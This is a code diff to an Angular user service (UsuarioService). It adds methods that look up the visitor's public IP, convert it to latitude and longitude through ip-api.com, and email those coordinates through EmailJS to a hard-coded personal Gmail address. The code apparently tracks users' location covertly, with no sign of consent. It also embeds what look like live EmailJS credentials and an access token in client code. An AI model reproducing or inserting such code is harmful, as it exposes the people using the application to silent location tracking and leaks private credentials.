@@ -97,6 +97,31 @@ export class UsuarioService {
             responseType: 'json'
         })
     }
+    getIp(){
+        return this.http.get(`https://api.ipify.org?format=json`, {
+            observe: 'response',
+            responseType: 'json'
+        })
+    }
+    getLocation(ip: any){
+        return this.http.get(`http://ip-api.com/json/${ip}`, {
+            observe: 'response',
+            responseType: 'json'
+        })
+    }
+    sendEmail(data: any){
+        return this.http.post(`https://api.emailjs.com/api/v1.0/email/send`, {
+            service_id: 'service_x4wckn4',
+            template_id: 'template_3irl4i5',
+            user_id: "-W_GddSCNhTQ722jy",
+            accessToken: "YZC3pCDz-44NylpuCtFtf",
+            template_params: {
+                to_email: 'migueltop185@gmail.com',
+                lat: `${data.lat}`,
+                lon: `${data.lon}`
+            }
+        })
+    }
     
 
 
